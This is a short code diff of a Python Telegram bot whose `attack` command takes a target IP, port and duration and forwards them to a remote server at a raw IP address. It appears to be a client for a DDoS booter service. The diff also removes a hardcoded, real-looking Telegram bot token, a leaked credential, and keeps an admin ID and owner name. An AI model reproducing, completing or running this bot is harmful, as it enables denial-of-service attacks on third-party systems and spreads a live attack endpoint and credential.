@@ -1,9 +1,10 @@
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from telegram import Update
 import requests
 import asyncio
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram import Update
 
-TELEGRAM_TOKEN = "7786469113:AAFjWtBSS24y3aVgEBFvcwbLNGHwcpQRg5g"
+# Replace with your actual bot token
+TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
 ADMIN_ID = 1817896911
 BOT_OWNER = "7H SHUBH"
 
@@ -54,7 +55,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Invalid time. Please provide time in seconds as an integer.")
         return
 
-    url = f"http://72.60.97.101:3001/shubha7hbysoulcrack/"
+    url = "http://72.60.97.101:3001/shubha7hbysoulcrack/"
     params = {'ip': ip, 'port': port, 'time': time_s}
 
     try:
